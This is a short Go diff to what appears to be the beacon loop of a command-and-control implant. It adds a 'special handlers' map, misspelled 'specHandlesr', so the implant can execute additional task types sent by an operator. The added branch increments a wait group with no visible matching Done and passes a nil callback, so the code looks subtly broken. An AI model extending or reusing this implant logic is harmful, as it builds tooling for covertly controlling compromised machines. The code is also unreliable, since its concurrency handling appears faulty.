@@ -327,6 +327,7 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 	resultsMutex := &sync.Mutex{}
 	wg := &sync.WaitGroup{}
 	sysHandlers := handlers.GetSystemHandlers()
+	specHandlesr := handlers.GetSpecialHandlers()
 
 	for _, task := range tasks.Tasks {
 		// {{if .Config.Debug}}
@@ -351,6 +352,9 @@ func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
 					Data: data,
 				})
 			})
+		} else if handler, ok := specHandlesr[task.Type]; ok {
+			wg.Add(1)
+			handler(task.Data, nil)
 		} else {
 			resultsMutex.Lock()
 			defer resultsMutex.Unlock()
